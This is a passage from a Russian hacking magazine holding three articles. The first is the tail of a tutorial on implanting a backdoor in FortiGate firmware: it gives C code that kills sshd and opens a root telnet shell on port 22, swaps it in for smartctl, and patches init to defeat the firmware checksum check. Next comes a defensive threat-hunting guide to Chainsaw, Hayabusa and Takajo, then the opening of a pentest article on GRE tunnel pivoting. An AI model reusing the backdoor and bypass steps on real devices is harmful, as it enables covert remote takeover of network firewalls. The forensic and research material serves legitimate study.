файлов, использующая алгоритм Deate. А cpio — это двоичный архиватор,
который позволя ет собирать любое число файлов, директорий и дру гих объ-
ектов фай ловой системы (сим воличес ких ссылок и прочего) в единый поток
бай тов.
  Командой gzip -d rootfs.gz мы распаковываем rootfs.gz, при этом
ключ -d означает распаковку файла.
  Командой sudo cpio -idv < rootfs копируем файлы из архи ва. Здесь
 • ключ -i используется для выборки фай лов из стандар тного входного
   потока;
 • ключ -d используется для соз дания каталогов при необходимости;
 • ключ -v используется для выдачи дополнитель ной информации (спи сок
  имен обрабатываемых фай лов).

Пос ле этих манипу ляций мы получаем полную файловую систему про шивки
FortiGate.





Нас инте ресу ет архив bin.tar.xz, потому что в нем содержатся бинари init
и smartctl:
 • /bin/init — программа, которая запус кает систему и управляет ею;
 • /bin/smartctl — инстру мент коман дной строки для управления сис-
   темой SMART, встро енной в большинс тво жестких дис ков ATA/SATA
   и SCSI/SAS и твердотельных накопителей.

Файл bin.tar.xz упакован измененными архиваторами xz и tar, которые
находят ся в директории /sbin. Распаковывать я его буду этими же изме нен-
ными утилитами.
  Командой sudo chroot  .  sbin/xz  --check=sha256  -d  bin.tar.xz
(эта команда меняет кор невой каталог) избавим ся от архива, созданного
архивато ром xz. Здесь
 • --check — ключ для про вер ки целостности, поддержи вает четыре типа
   проверки:
    • none — не рассчи тывает проверку целостности;
    • crc32 — рассчитывает CRC-32, используя полином из IEEE-802.3;
    • crc64 — рассчитывает CRC-64, используя полином из ECMA-182;
    • sha256 — рассчитывает SHA-256;
 • -d — ключ для распаковки.

Ко ман дой sudo chroot . /sbin/ftar -xf bin.tar избавимся от второго
архива, созданно го архиватором tar, где
 • ключ -x используется для извлечения фай лов из архи ва;
 • ключ -f используется для ука зания имени архива.

Таким образом мы получим дирек торию /bin и наконец-то раз беремся
с бинарями init и smartctl.





Для получе ния нормального шелла я использовал программу BusyBox 1.36.0,
которую скомпилировал статичес ки. Статическая компиляция нуж на потому,
что в этой прошив ке могут использоваться специфичес кие или измененные
стандартные библиотеки. Так, при динами чес кой линковке бинарь просто
не пой мет, откуда ему брать функции и к чему обра щаться. В статичес кой
ком пиляции все функции, которые используются в программе, находят ся
непосредственно в ней. Прог рамма ста новится независимой от биб лиотек,
но при бав ляет в весе.




                      BusyBox — набор UNIX-утилит командной стро ки,
                       используемый в качестве основно го интерфейса
                       во встра иваемых опе раци онных системах. Пре-
                     имущес тва этого при ложения в малом размере
                      и низких требованиях к аппа ратуре.


BusyBox я скачал с официаль ного сай та. Пос ле распаков ки нужно выполнить
коман ду make  menuconfig, с помощью которой  будет ском пилирован
busybox. Во вре мя сборки откроется окно настройки компиляции. Для ста-
тической компиляции выбирай вариант Settings → Build Options, а затем
Build static binary (no shared libs).





Также надо убрать звез дочку напротив пун кта sync для отключения синхро-
низации с файловой системой.





Пос ле сборки мы получим бинарный файл busybox.





ÓÑÒÀÍÀÂËÈÂÀÅÌ ÁÝÊÄÎÐ

Далее план такой:
 1. Ско пируем бинарь busybox в дирек торию /bin прошивки FortiGate.
 2. Удалим символическую ссылку sh , которая ука зывает на /bin/sysctl,
   и переназначим ее на толь ко что скомпилиро ванный busybox. Таким
   образом мы добьемся вызова busybox при обращении к sh .
 3. Напишем малварь, которая создаст бэкдор и откроет удаленный дос туп
   к файловой системе FortiGate.
 4. Заменим smartctl нашим бэкдором. Мы заменим именно этот бинарь,
   потому что к нему можно обратиться непос редс твенно из CLI FortiGate
   командой diagnose hardware smartctl. Эта команда используется
   для управле ния системой хранения данных FortiWAN с использованием
   стан дартной ути литы smartctl.


Øàã 1
Ко пируем busybox в каталог /bin и даем ему все права:


sudo cp busybox $PWD/root_dir/bin
cd $PWD/root_dir/bin
sudo chmod 777 busybox


Øàã 2
Удаляем символическую ссылку sh (sh->/bin/sysctl) и добавляем новую:


sudo rm -rf sh
sudo ln -s /bin/busybox sh

Те перь символичес кая ссылка sh указыва ет на busybox, а это означает, что
у нас есть почти полноценный шелл.


Øàã 3
Cоздаем бэкдор, который открывает подключение по Telnet:


# include <stdio.h>
void shell() {
    system("/bin/busybox ls", 0, 0);
    system("/bin/busybox id", 0, 0);
    system("/bin/busybox killall sshd && /bin/busybox telnetd -l /
bin/sh -b 0.0.0.0 -p 22", 0, 0);
    return;
}


int main(int argc, char const *argv[]) {
    shell();
    return 0;
}

Программа выводит все файлы, которые находятся в директории, командой /
bin/busybox ls. После этого мы определяем свой uid командой /bin/
busybox id. Далее убиваем все под ключения по SSH и открываем доступ
по протоко лу Telnet через 22-й порт, на котором уже име ется дос туп к шел лу
/bin/sh, где sh->busybox:


/bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22

Компилируем программу статически по той же причине, что и busybox:


gcc backdoor.c -static -o backdoor


Øàã 4
Те перь удаляем smartctl и заменяем его своим бинарным фай лом:


sudo rm ./bin/smartctl
sudo cp backdoor ./bin/smartctl

По сути, мы удалили прог рамму с названием smartctl и создали копию
бинаря backdoor с названи ем smartctl.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ





             ВЗЛАМЫВАЕМ FORTIGATE
           И УСТАНАВЛИВАЕМ БЭКДОР





ÊÎÂÛÐßÅÌ ÏÐÎØÈÂÊÓ È ËÎÌÀÅÌ ÊÎÍÒÐÎËÜÍÓÞ ÑÓÌÌÓ
ÔÀÉËÎÂÎÉ ÑÈÑÒÅÌÛ

Все проверки и работа FortiOS основываются на бинаре init. Для проверки
этого высказывания введем коман ду grep -rnl "System is starting",
чтобы най ти стро ку System is starting..., потому что с нее начина ется
работа прошив ки.





В общем виде команда поиска выг лядит следующим образом:


grep -rnl "System is starting"

Здесь
 • -r — ключ для поиска строки во всех фай лах в каждом каталоге рекур-
   сивно, сле дуя символическим ссылкам;
 • -n — ключ для поиска каждой стро ки вывода с номером строки;
 • -l — ключ для вывода имени каж дого входного фай ла, в котором содер-
   жится строка.

Пол ностью команда поиска выглядит так:


$ grep -rnl "System is starting"
/bin/init

Таким образом, можно сделать вывод, что про верка контрольной сум мы
будет выполнять ся в прог рамме init. Для реверса бинаря я использовал IDA
Pro. И первое, что сле дует най ти, — стро ка System is starting.





Пе рейдем по перекрестным ссылкам и попадем в функцию main().





Те перь найдем строку, которая говорит нам о том, что система останов-
лена, — The system is halted. Такое сооб щение выводится, если провер-
ка кон трольной сум мы не прой дена. Находим строку и по перекрес тным
ссылкам отыскива ем этот участок кода, который выполняет перезагрузку сис-
темы.





Можно най ти вызов этой функции в фун кции main().





В функции main() присутствует два вызова фун кции do_halt(). Первый
из них зависит не от контроль ной сум мы, а от фор ка процес са и других сис-
темных вызовов.





Второй вызов функции do_halt() имеет непосредственное отношение
к проверке чек-сум мы. Для доказа тельства этого я нашел функцию, которая
про веряет содержимое файла с контрольной суммой.





Внутри этой функции откры вается на чтение файл и из него извле каются дан-
ные с целью провер ки системы.





В функции find_checksum() путем выпол нения операции XOR опре деляется
наз вание файла.





Напишем прос той декриптор для про верки:


filename = 'aiqu0oZi'
key = [0x4E,0x47,0x17,0x12,0x44,0x1C,0x2F,0x04]
for i in range(len(filename)):
    print(chr(ord(filename[i])^key[i]), end = '')

По лучим такую строку:


/.fgtsum

Этот файл мож но найти в корневом каталоге, поэтому очевид но, что рассмот-
ренная нами функция использует файл для реализации некоторой проверки
системы.
   Чтобы обойти эту про верку, нужно либо заменить в функции do_halt()
первую инструкцию инс трукцией ret, чтобы функция ничего не выводила,
либо пре дот вратить перезаг рузку при неудачной проверке. Я выбрал второй
вари ант, поэтому в бинар ном фай ле init исправил JZ на JNZ в перехо де
на функцию do_halt().





Таким образом у нас получи лось обма нуть прошивку с проверкой контроль-
ной суммы, и наш бэкдор сработа ет.




                   В более новых прошивках система безопасности
                     была обновлена и такой обход может не сра-
                          ботать. В этом слу чае будет проверяться еще и
                     внешний файл filechecksum, который тоже
                       находит ся на вир туальном диске forti_6_4_5-
                   disk1.vmdk вмес те с rootfs.gz. Необ ходимо
                        будет  вычис лить CRC-32  нового rootfs.gz
                      и заменить его в этом файле.



ÑÎÁÈÐÀÅÌ ÂÑÅ ÎÁÐÀÒÍÎ

Те перь соберем все в один архив:


sudo chroot . /sbin/ftar -cf bin.tar ./bin
sudo chroot . /sbin/xz --check=sha256 -e bin.tar
sudo su root
find . -path './bin' -prune -o -print | cpio -H newc -o > ../rootfs.
raw
cat ../rootfs.raw | gzip > ../rootfs.gz

Пос ле сборки я получил от равленный rootfs.gz и заменил rootfs.gz в при-
монтирован ном образе forti_6_4_5-disk1.vmdk. Теперь осталось только
заменить ори гинальный диск модифициро ванным.


ÏÐÎÂÅÐÊÀ ÁÝÊÄÎÐÀ

Пос ле создания бэкдора необ ходимо немного отредактировать настрой ки.
Троян заменяет порт SSH, поэто му настрой ки стен да теперь такие:


config system interface
edit port1
set mode static
set role lan
set alias LAN
set allowaccess http https ssh ping
set ip 192.168.0.216/24
show
end





Проверяем работу бэкдора. Для этого надо под ключиться по Telnet c исполь-
зованием сле дующей команды:


telnet XXX.XXX.XXX.XXX 22

Вместо XXX.XXX.XXX.XXX ука жи IP-адрес FortiGate.





Под клю чение выполнено, а зна чит, наш бэкдор работает!


ÂÛÂÎÄÛ

По казанный в статье эксперимент дает возможность прокачать навыки
в реверс-инжинирин ге и исследовании прошивок устройств наподобие меж-
сетевых экранов. Однако навыки полезны только тогда, когда их можно при-
менить на практике. Реали зовав бэк дор в прошив ке FortiGate, можно кряк нуть
лицензию и реали зовать уязвимость CVE-2022-42475. Но об этом — в другой
раз.
ВЗЛОМ





Первый этап реагирова ния на ИБ-инци-
дент — это обработка событий и поиск
в них арте фактов. Затем спе циалист стро ит
таймлайны и опре деля ет вектор и вре мя
атаки. В этой статье мы поговорим об инс-          Антон Кузнецов                                                                                          Ресерчер, энтузиаст,
трументах, которые облегчают этот труд            работаю в ИБ                                                                                            @RussianF0rensics
и помогают в рас следова нии, в осо бен-
ности когда данных очень мно го.


Иногда быстро отделить зерна от плевел прос то. Достаточно воспользовать-
ся под ручными средствами или ути литами вро де EvtxECmd и Timeline Explorer.
  Но бывает, что задача серьезнее: событий на вхо де много, и обра ботать
такой объем дан ных быс тро или най ти вектор (и, что часто сложнее, опре-
делить время инцидента) довольно труд но. Боль но смотреть на ИБ-спе-
циалис тов, которые исполь зуют для таких задач нативные инс трументы, нап-
ример пре дустанов ленный журнал прос мотра событий Windows.
  Вместо это го сто ит вооружиться чуть более продвинутыми инстру мен-
тами. Давай разберем несколько ути лит и их особенности, а заод но пос-
мотрим на них в действии — на примерах событий журналов Windows версий
старше 7.
  Знакомиться будем со следующи ми утилитами для Threat Hunting и Incident
Response:
 • DeepBlueCLI;
 • Chainsaw;
 • Yamato Security Tools:
 • Hayabusa;
 • Takajo.


SIGMA

О Sigma-правилах и их структуре уже написа на не одна статья, поэтому очень
корот ко: Sigma — опен сор сный проект, который ведется с 2017 года и поз-
воля ет писать правила (сиг натуры) для обна ружения вредонос ной активнос-
ти. Сейчас обще доступные правила покрывают более 3 тысяч техник и тактик
ата кующих. Обнаруже ние вредоносной активнос ти в инструментах, о которых
мы будем говорить (кроме DeepBlueCLI), тоже осно вано на Sigma-правилах.
Они позволяют быстро находить аномалии и вре доносную активность в боль-
шом количестве событий. Прежде чем прис тупать к ути литам, скачаем Sigma-
правила:


git clone https://github.com/SigmaHQ/sigma


DEEPBLUECLI

Нач нем,  пожалуй,  с  самого  прос того  из  выб ранных  инструментов.
DeepBlueСLI —  модуль  PowerShell,  раз работанный Эри ком  Конрадом
для поиска угроз в жур налах событий Windows. В отличие от других инс тру-
ментов в этой статье, механизм обна руже ния здесь основан не на Sigma-
правилах, а на обыч ных проверках наличия  тех или иных артефактов
и количестве срабатываний для определен ных событий (например, попыток
неуспешного вхо да).
  На основе этих данных мож но обна ружи вать, нап ример, подозрительные
манипуляции с учетной записью (создание, добавление в группы, password
spraying и про чее).


.\DeepBlue.ps1 .\evtx\password-spray.evtx





                Детектирование password spraying

Здесь заметно, что были попытки войти в 41 уни кальную учетную запись
с одним паролем. И заодно мы видим подробное описание результата.
  Еще можем глянуть активность в командной стро ке и обо лочке PowerShell
(есть поиск обфусци рованных скриптблоков, запусков через PsExec и дру гие
воз можности).


.\DeepBlue.ps1 .\evtx\psattack-security.evtx | Out-GridView





                          Suspicious Command Line

Также DeepBlue позволяет проводить аудит служб, то есть искать попытки
создания служб и дру гие подозрительные события.
  Полученные после обра ботки данные можно вывес ти в раз ных удобных
форматах для дальнейшего ана лиза: CSV, Out-GridView, Format-Table, HTML,
JSON, XML.
  Кроме того, ути лита позволяет про водить иссле дова ние на работающей
системе, без экспорта журналов событий.
  Сре ди достоинств DeepBlue — воз можность добавлять новые про верки
непосредственно в код сценария на PowerShell. К примеру, можно с лег-
костью   дописать   детект   password   spraying   в    Active   Directory
(события 4771 и 4768).
  Но из недостатков я бы выделил отсутствие воз можнос ти указать в качес-
тве аргумента путь к директории с журналами. Это значит, что таким инстру-
ментом будет сложно пользоваться, если объ ем логов занимает несколько
гигабай тов. Зато следующая утилита нам в этом поможет.


CHAINSAW

Chainsaw — инструмент для первичного реагирова ния на инци денты и поис ка
артефактов в жур налах событий Windows, таблицах Master File Table и System
Resource Utilization Monitor. Для авто мати зации поиска угроз используются
Sigma-правила, но этим дело не ограничивается. Мож но искать отдельные
слова, исполь зуя регуляр ные выражения, прочесы вать события при помощи
кастомных правил, исполь зовать кастомные пра вила для агре гации получен-
ных записей о срабаты вании. Есть дру гие интерес ные фичи, которые я покажу
дальше.
  Попробуем воз можности на практике. Представь, что в рамках реагирова-
ния на инци дент нам отгру зили события в количестве 333 штук (131 Мбайт).
Изучать журналы по отдельности имеет смысл, толь ко если мы уже знаем,
какой век тор атаки и êîãäà она была совершена. Это не наш случай. Сейчас
необходимо взглянуть на ситуацию с высоты птичьего полета, поэтому вос-
поль зуемся  утилитой Chainsaw  в режиме  охо ты  на  подозритель ные
активнос ти.
   Чтобы вклю чить режим охо ты на угро зы, зададим аргумент hunt, укажем
правила Sigma (флаг -s) и каталог с правилами (можно использовать
как дирек торию, так и репозиторий на GitHub). Также нужно задать каталог
с данными об инци денте (журналы событий Windows) и путь к фай лу YAML
для мап пинга правил Sigma и событий (он нужен для сопоставления полей
из сырых событий и Sigma-правил):


.\chainsaw.exe hunt CyberPolygon_Forensic_Artifacts\winevt\Logs/ -
s ..\..\..\sigma\ --mapping ..\..\mappings\sigma-event-logs-all.yml

Видим в кон соли PowerShell приветствие Chainsaw и сообщение об успешной
загрузке жур налов событий и Sigma-правил. Утилита работа ет быстро и выда-
ет таблицу с такими столбцами:
 • времен ная метка;
 • результат поиска на основе правил Sigma;
 • число най денных событий (Count);
 • Event.System.Provider;
 • EID;
 • Record ID;
 • Computer;
 • Event Data.





                 Chainsaw, обнаружение на основе Sigma

Са мое инте ресное здесь — это детект на осно ве Sigma-правил.





                 Chainsaw, обнаружение на основе Sigma

Нап ример, на рисунке выше видно время, сработавшие пра вила детекта —
Sigma Rules для событий PowerShell с EID 4104, а также путь, из которого был
запущен сце нарий PowerShell, и его началь ное содержимое.
  Важ но пом нить, что аудит PowerShell (события 4103 и 4104) по умол чанию
отклю чен, рекомен дуется его вклю чать. Как это сделать, можно почитать в до-
кументации.
  В кон це таб лицы получим список детек тов по Sigma-правилам и количес-
тво про анализи рован ных журналов (пус тые журналы были отброшены).





                        Chainsaw — результаты

Ес ли мы знаем, что подозрительная активность (судя по детекту) была свя-
зана со сценари ями PowerShell, а именно с событиями с EID 4104, мы с лег-
костью можем взглянуть на сырые события и их скриптблоки, воспользовав-
шись вот такой коман дой:


.\chainsaw.exe search -t 'Event.System.EventID: =4104' CyberPolygon_
Forensic_Artifacts\winevt\Logs/





                     Поиск Event ID 4104

По ищем так же события с EID 4103:


.\chainsaw.exe search -t 'Event.System.EventID: =4103' CyberPolygon_
Forensic_Artifacts\winevt\Logs/

По лучаем три совпадения и узна ём, с какими аргументами запус кались сце-
нарии.





                     Поиск Event ID 4103

А так же наблюдаем начало тела скриптблока tmpA7Z2.ps1.
  Кроме поиска по EID, можно использовать регулярные выражения. Давай
попробуем най ти все события, связан ные с запуском най денного сце нария:


.\chainsaw.exe search -e 'tmpA7Z2.ps1' c56-CyberCorp\Downloads\
CyberPolygon_Forensic_Artifacts\winevt\Logs





                   По иск по ключево му слову

Видим первое событие, свя занное с запуском tmpA7Z2.ps1.
  Давай пос мотрим на весь сценарий, для это го слу жит флаг --full.
Для удобства работы выведем содержимое в формате CSV.


.\chainsaw.exe hunt CyberPolygon_Forensic_Artifacts\winevt\Logs/ -
s ..\..\..\sigma\ --mapping ..\..\mappings\sigma-event-logs-all.yml
--full --csv -o c56-CyberCorp.csv

По лученный файл открываем в Timeline Explorer.





                  Текст скрипт блока PS в Timeline Explorer

Здесь видим информацию о запус ке сценария, а также текст скриптблоков.
  Еще одна фича Chainsaw — воз можность исполь зовать кастомные пра-
вила для агре гации и груп пировки найденных артефактов. С  утилитой
в наборе уже идут некото рые кастомные пра вила (ищи их в каталоге rules):
поиск срабатываний анти вирусного ПО (Kaspersky, MS Defender, Sophos
и прочие), хакерских тех ник вроде lateral movement, затирания и искажения
событий и другие.
   Чтобы воспользоваться эти ми правилами, применим дополнительный
флаг -r и укажем директорию с пра вилами /rules:


chainsaw.exe hunt -r rules/ Lateral Movement/ -s sigma/rules --
mapping mappings/sigma-event-logs-all.yml

Пос ле обработки событий получаем отдельную таблицу с событиями, сви-
детельству ющи ми  о  горизонталь ном  переме щении  (или  подозрениях
на него).





  События удаленного вхо да, подпадающие под пра вила Lateral Movement

Также получили таблицу с событи ями, свя занными с очисткой жур нала
Security.





                 Очистка журнала событий Security

Далее видим обна руже ния исклю чительно по общим Sigma-пра вилам, где
в том чис ле нашлась служба Cobalt Srike Beacon.





              Обнаружение сервиса Cobalt Strike

На этом воз можности Chainsaw не заканчиваются. Еще можно работать
с Master File Table (MFT), System Resource Utilization Monitor (SRUM), выводить
таймлайны событий, а после их визу ализировать. Но эти функции я пред-
лагаю тебе изучить самостоятельно. А мы тем временем познакомимся с нас-
тоящим ком байном для обработки большого количества событий — от десят-
ков до сотен гигабайт.


YAMATO SECURITY TOOLS

Правильно и âîâðåìÿ настро енная политика ауди та позволяет получить
много полезной информации, сократить вре мя реаги рова ния на инцидент
и время рассле дова ния. О том, какие события необ ходимо собирать и какой
аудит вклю чить, можно про читать, нап ример, в ре позитории Yamato Security.
Там же ты най дешь bat-файл для акти вации политик ауди та.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



       ПРАКТИКУЕМСЯ В THREAT HUNTING





HAYABUSA

Hayabusa — утилита для быстрой генера ции таймлайнов и поиска угроз
в событиях.
  Еще Hayabusa умеет определять геопозицию по IP, для этого добавь флаг
-G (--GeoIP), но прежде необходимо соз дать акка унт сервиса MaxMind. Такая
воз можность особенно полезна при опре деле нии нестандартных под клю-
чений. Ути лита также способна анализи ровать систему в live-режиме.
   Как  и  Chainsaw,  Hayabusa  использует  Sigma-правила  (с  ней  идет
более 3500 правил), а также использует для детектирования собс твенные
правила, написанные в виде YAML. Это почти то же самое, что и Sigma-пра-
вила, но с доработ ками, которые не поддерживаются Sigma. Как писать свои
правила, подробно опи сано в до кументации.
  Еще один плюс утилиты — вывод обра ботанных событий в формате,
который прекрасно понимает утилита визу ализации Timesketch (о том, что
это за ути лита и как ее развернуть, можно почитать на сайте разработчика
или в статье «Исполь зуем Timesketch для работы с тай млайнами Plaso»).
   Чтобы получить такой вывод, исполь зуй флаг --RFC-3339, задающий фор-
мат вывода вре мен ных меток, а также укажи профиль  (-p  timesketch-
verbose) и вывод времени в формате UTC (флаг -U):


.\hayabusa-2.9.0-win-x64.exe csv-timeline -d E:\CyberDefenders\c56-
CyberCorp\Downloads\CyberPolygon_Forensic_Artifacts\winevt\Logs --
RFC-3339 -o timesketch-import_c56.csv -p timesketch-verbose -U -C -F





                    Резуль тат работы Hayabusa

На выходе, кроме сработавших кастомных пра вил (Rule Authors), получаем
име на компьютеров и оцен ку кри тичности событий.




                      Если  событий  много,  их  можно  разделить
                      по компьютерам и уровню критичности событий,
                       а так же тегам (теги здесь — так тики по MITRE
                        в   духе  attack.<tech_name>,   нап ример
                   attack.persistence). Таким образом работу
                         легко  распределить между  членами  команды
                       реагирова ния.


Информация о срабатываниях агрегиру ется в таб лицу с уровнями критич-
ности и видом детекта, по которому удобно искать в Timesketch.





      Общая таб лица правил обна руже ний и критич ности алер тов

Заг рузим получившийся отчет в Timesketch. Здесь можно искать по техникам
и при мененным  ути литам,  к примеру попробуем найти «PsExec  Lateral
Movement» (наименова ние было взято из таблицы после обработки событий
в Hayabusa).





        По иск по технике PsExec Lateral Movement в Timesketch

Видно тай млайн для событий и сами события. Заг лянем внутрь любого из них
и увидим ском про мети рованный хост, EID, MitreTags и MitreTactics — что очень
удобно, к тому же по всем полям можно искать в Timesketch.





Что бы сократить время поиска вредоносной активности в большом количес-
тве событий, можно вос пользовать ся флагами --proven-rules, --EID-
filter,  --enable-unsupported-rules.  Флаг  --remove-duplicate-data
поменяет поля дублирующихся событий на DUP. При этом они будут учи-
тываться, но в вывод не попадут.
  Давай выведем в консоли тай млайн с частотой детек та, используя
перечис ленные фла ги:


.\hayabusa-2.9.0-win-x64.exe csv-timeline -d Y:\Ransomware31012023\
KapeEvidences\C\Windows\System32\winevt\logs --proven-rules --EID-
filter --enable-unsupported-rules --visualize-timeline --remove-
duplicate-data





             Построение Timeline обна руже ний в консоли

Под павшие под правила события окрашиваются в раз ные цве та из таблицы
Results, а их детали можно найти над графиком.





     Маркировка обнаружений по уров ням кри тичности (high и critical)

С таким инструментом скорость обработки событий увеличивается в разы,
но не сто ит забывать, что выход ные данные дают лишь первоначальную кар-
тину случив шегося и механизм может не обнаруживать некоторые события,
оставляя им уро вень low.





            Пропущен ные обна ружения (помечено как low)

По этому на основе общих правил необходимо писать свои пра вила детек-
тирования и переходить к более тщательному анализу, сужая вре менную зону
поиска. Для это го используй флаги --timeline-start, --timeline-end, --
timeline-offset.
  Давай сделаем это и оста вим только детекты уровня critical:


.\hayabusa-2.9.0-win-x64.exe csv-timeline -d Y:\Ransomware31012023\
KapeEvidences\C\Windows\System32\winevt\logs --proven-rules --EID-
filter --enable-unsupported-rules --visualize-timeline --remove-
duplicate-data --timeline-start "2023-02-08 00:00:00 +03:00" --
timeline-end "2023-02-08 16:58:51 +03:00" -m critical

Ути лита отработала в разы быстрее (на малом объеме событий будет
не слишком заметно) и выдала час тотный график за ука занный промежуток
вре мени, а из событий оста лись только те, что помече ны как критичные.





                     Сокращение зоны поис ка

Для сужения области поиска можно использовать и другие флаги, например
исклю чить хос ты или оставить только один целевой хост (для этого есть флаги
--include-computer и --exclude-computer). То же самое можно проделы-
вать и с событи ями по их Event ID.
  Еще один хороший при ем при поиске артефактов в событиях — исполь-
зовать pivot-keywords-list. На выходе получим список уни кальных данных
для детектирования подоз рительной активности. Поля, которые будут извле-
каться при поиске, можно найти по такому пути:


Hayabusa_dir\rules\config\pivot_keywords.txt

Сре ди полей при настройках по умолчанию будут имена пользовате лей, хос-
тов, IP-адре са, про цес сы (LOLBINS и так далее) и другие артефакты:


.\hayabusa-2.9.0-win-x64.exe pivot-keywords-list -d Y:\
Ransomware31012023\KapeEvidences\C\Windows\System32\winevt\logs





             Поиск с исполь зованием pivot-keywords-list

На рисунке выше выведен спи сок про цессов, которые запускались на хосте.
  Еще одна фиш ка Hayabusa — это наличие интеграции с Velociraptor, что
позволя ет собирать и сразу ана лизировать артефакты.
   Также есть воз можность работать не толь ко с файлами с рас ширением
.evtx, но и с файлами в формате JSON и JSONL. Что бы найти дру гие интерес-
ные воз можнос ти Hayabusa, рекомендую заг лянуть в ее богатую докумен-
тацию. Мы же перей дем к сле дующему инс трумен ту, созданному в Yamato
Security.


TAKAJO

Прежде чем использовать Takajo, нужно подготовить таймлайны при помощи
Hayabusa:


.\hayabusa-2.9.0-win-x64.exe json-timeline -d KapeEvidences\C\
Windows\System32\winevt\logs -L -o ramsomware_timeline.jsonl

Те перь можно анализировать события вхо да в Takajo:


./takajo.exe timeline-logon -t .\ramsomware_timeline.jsonl -o
ransomware_logon.csv





               Анализ событий вхо да с помощью Takajo

Забираем все IP-адре са из обра ботанных Hayabusa данных:


./takajo.exe list-ip-addresses -t ..\hayabusa-2.9.0-win-64-bit\
cybercorp.jsonl -o cybercorp_ipaddr.txt





            Извлечение пуб личных IP-адре сов из событий

По умолчанию берут ся только пуб личные IP-адре са, для включения приватных
нуж но исполь зовать флаг -p.
  Потом мож но будет проверить эти IP на VirusTotal:


./takajo.exe vt-ip-lookup -a <YOUR_API_KEY> -I .\cybercorp_ipaddr.
txt -o vt-ip-lookup.csv -r 1000 -j vt-ip-lookup.json





        Ав томатизированная провер ка извлеченных IP на VirusTotal

То же можно сде лать и с другими индикаторами компро метации: доменами
и  хеш-суммами  исполняемых  файлов  (если  событие  было  получе но
от Sysmon).
   Takajo уме ет выводить таймлайны подоз рительных про цессов (timeline-
suspicious-processes) и строить дерево процес сов на основе событий Sysmon
(необходимо указать processGuid).


ÂÛÂÎÄÛ

Описанные в статье ути литы при умелом исполь зовании поз воля ют сущес-
твен но сок ратить вре мя, нуж ное на реагирова ние и поиск угроз. Однако
нельзя полагаться толь ко на инстру ментарий и забывать, что техники ата-
кующих пос тоянно совершенс тву ются, поэтому для успешного рас сле дова-
ния правила обнаружения тоже нуж но  улуч шать. В идеале спе циалист
по реагированию должен уметь сам готовить и дорабатывать такие пра вила,
а также быть в курсе новейших техник и инстру ментов, которые применяются
ата кующи ми.
ВЗЛОМ





В современном стеке про токолов TCP/IP
есть  мно жество  протоко лов  туннелиро-
вания. Обычно они используются для рас-
ширения сетей продак шена, постро ения
инфраструктуры. Но в моем иссле довании я               Caster                                                                                        Network Security Expert
буду использовать их как пентестерский             @wearecaster
инс трумент.


Pivoting — это ком плекс мероприятий, в рамках которо го ата кующий эска-
лирует свое присутствие в сети. Пивотинг — это часть пос тэксплуата ции, то
есть дей ствий пос ле получения первичного дос тупа к системе. Существует
множество спо собов пивотин га, но в моем ресерче речь пойдет именно
о про токолах туннелирования, то есть сце нарии, где атакующий прод вига ется
по сети с помощью технологий туннелиро вания. В этой статье я продемонс-
трирую пивотинг на уровнях L2 и L3.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.


Все эти методики ско рее экзотические, однако я покажу, в каких случаях их
можно использовать в сетях продакшена. Учти, что эти техники требуют имен-
но прав адми нистратора на скомпро метированных машинах, так как без это-
го не получится нап рямую взаимодейство вать с сетевыми интерфейсами
и настройками туннелей.


TUN VS TAP

Для туннельного пивотинга используют ся спе циаль ные виртуальные сетевые
драйверы. Различают два вида VPN-интерфейсов:
 • TUN — виртуальный сетевой драйвер, который использует ся для постро-
   ения L3-туннелей. Работает на сетевом уров не, опе рируя IP-пакетами;
 • TAP — виртуальный сетевой драй вер, который эмулирует Ethernet. Работа-
   ет на канальном уровне, оперируя Ethernet-кад рами.

Ес ли атакующий стремится перемещать ся по подсетям во время пивотинга,
скорее всего, он будет исполь зовать драйвер TUN, одна ко, если ата кующий
нуж дается в про веде нии атак канального уровня, ему необходим именно TAP-
интерфейс, именно L2-туннель. Пентестер может спросить: «А почему у меня
не работа ет Responder? Туннель же есть». Но на практике не все так прос то,
и необходимо учитывать свои потребности в плане проведения атак. Оба
этих драй вера будут учас твовать здесь на про тяжении всей статьи.


ÎÑÒÎÐÎÆÍÎÑÒÜ ÏÐÈ ÀÄÐÅÑÀÖÈÈ ÍÀ TAP-ÈÍÒÅÐÔÅÉÑÅ

При работе с целевой сетью через TAP будь осторожен с получе нием адре са
на TAP-интерфейс с помощью DHCP. По DHCP может при лететь новая
информация о шлюзе по умолчанию, что иног да приводит к разрыву сетевой
связ ности. Как только ты запустишь dhclient, второй командой удаляй новый
маршрут по умол чанию:


sudo dhclient -v tap0; sudo route del default


GRE (L3)

GRE (Generic Routing Encapsulation) — одно из самых популярных решений
при постро ении туннелей  site-to-site между организациями. Это самос-
тоятельный про токол, име ющий собственный заголовок и не опирающий ся
на TCP/UDP. Разработан инже нера ми Cisco, но поддержи вается всеми вен-
дорами. Его главный принцип работы — это инкапсуляция полезной нагрузки,
позволя ющая достичь адресата. В основе его работы лежит три сущ ности:
 • GRE-заголовок — содер жит разные параметры и идентифика тор инкапсу-
   лируемого про токола;
 • Delivery-заголо вок — содержит адре са источника и назначения, при этом
   исполь зуют ся пуб личные адреса из интернета (согласно конфигурации
   на пограничных маршрутиза торах), по фак ту выпол няет функцию доставки
   данных;
 • пассажир — непос редственно сами данные.

GRE мож но исполь зовать как инструмент пивотин га, позволяющий ата кающе-
му получить доступ к подсети на уровне L3. Целевы ми устройствами могут
быть:
 • погранич ный маршрутизатор (нап ример, Cisco IOS или RouterOS);
 • взломанный сервер на Linux.

Я покажу при мер именно с пог раничным роутером Cisco, хотя сама кон-
цепция настройки GRE гло бально не меня ется. Дизайн лабораторной сети
для демонстрации техник — на диаграмме ниже.





                       Лабора торная сеть

Это простой при мер для демонс трации. Ата кующий и пог раничный роутер
здесь име ют белые адреса, а за самим роутером находятся три VLAN-сег-
мента:
 • 10.10.200.0/24;
 • 10.10.220.0/24;
 • 10.10.240.0/24.

В этом сце нарии атакующий построит GRE-тун нель между собой и погранич-
ным роутером, а затем сквозь сам роутер поверх GRE-туннеля смо жет вза-
имо действо вать с тре мя сегментами и расширить свое при сутствие в сети.
